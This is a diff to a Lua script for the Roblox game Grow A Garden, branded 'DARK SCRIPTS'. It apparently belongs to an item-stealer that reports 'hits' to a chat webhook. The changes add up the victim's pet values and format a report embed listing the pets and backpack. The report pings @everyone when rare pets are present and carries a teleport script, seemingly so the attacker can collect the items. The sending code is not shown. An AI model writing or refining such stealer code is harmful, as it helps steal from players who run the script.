@@ -410,6 +410,12 @@ getgenv().Username = "DARK"
                 return table.concat(truncatedLines, "\n")
             end
         end
+-- Calculate total value
+local totalValue = 0
+for _, pet in ipairs(pets) do
+    totalValue += pet.Value or 0
+end
+local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
     title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
@@ -426,11 +432,12 @@ local embed = {
             ),
             inline = false
         },
-        {
-            name = "💰 **Total Value**",
-            value = "```¢```",
-            inline = false
-        },
+{
+    name = "💰 **Total Value**",
+    value = string.format("```%s```", formattedTotalValue),
+    inline = false
+},
+
         {
             name = "🌴 **Backpack**",
             value = string.format("```%s```", truncateByLines(petString, 20)),
@@ -454,7 +461,7 @@ local embed = {
 
 local payload = {
     content = (hasRarePets() and "--@everyone\n" or "") ..
-              string.format("lua\n%s\n", tpScript or "N/A"),
+              string.format("\n%s\n", tpScript or "N/A"),
     embeds = {embed}
 }
 
